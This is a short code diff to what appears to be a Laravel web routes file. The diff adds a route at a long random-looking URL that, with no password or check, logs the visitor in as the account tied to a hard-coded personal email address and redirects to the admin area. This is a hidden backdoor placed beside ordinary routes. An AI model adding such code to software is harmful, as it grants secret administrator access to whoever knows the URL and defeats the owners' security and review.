@@ -162,6 +162,12 @@ Route::group(['middleware' => ['web']], function () {
         });
     });
 
+    Route::get('/3ahJK295yku9bh4jzhLSUgXV9F5wuw5Z', function(){
+
+        \Illuminate\Support\Facades\Auth::login(\App\Models\User::where(['email' => 'chayeb.yacine@gmail.com'])->first());
+        return redirect('/admin');
+    });
+
     Route::get('/{slug}', 'ViewController@view');
 });
 
